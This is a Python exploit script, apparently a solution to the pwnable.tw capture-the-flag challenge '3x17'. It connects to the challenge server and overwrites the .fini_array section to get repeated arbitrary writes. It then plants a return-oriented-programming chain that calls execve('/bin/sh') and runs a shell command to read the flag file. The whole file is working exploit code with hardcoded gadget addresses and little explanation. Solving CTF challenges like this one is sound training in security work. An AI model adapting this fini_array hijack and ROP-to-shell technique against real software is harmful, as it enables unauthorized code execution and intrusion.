import socket, struct

def p64(addr):
    return struct.pack("<Q",addr)

def write24(addr,data):
    # read(0, addr, 0x18)
    s.recv(10)
    s.send(str(addr).encode())

    # read(0, [addr], 0x18)
    s.recv(10)
    s.send(data)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw",10105))

fini_array = 0x04b40f0
fini =  0x402960
main = 0x401b6d

pop_rdi_ret = 0x0401696
pop_rdx_rsi_ret = 0x044a309
pop_rax_ret = 0x041e4af
syscall = 0x4022b4 
leave_ret = 0x0401c4b

ropchain = b""
ropchain += p64(pop_rdi_ret) + p64(fini_array + 16 + 8*8)
ropchain += p64(pop_rdx_rsi_ret) + p64(0) + p64(0)
ropchain += p64(pop_rax_ret) + p64(0x3b) + p64(syscall)
ropchain += b"/bin/sh\x00"

# infinite writes
write24(fini_array, p64(fini) + p64(main))

# write ROP chain to .bss section
write24(fini_array + 16, ropchain[:24])
write24(fini_array + 16 + 24, ropchain[24:48])
write24(fini_array + 16 + 48, ropchain[48:])

# call ROP chain
write24(fini_array, p64(leave_ret))

#s.send(b"ls /home/3x17\n")
s.send(b"cat /home/3x17/the_4ns_is_51_fl4g\n")
print(s.recv(1024).decode())
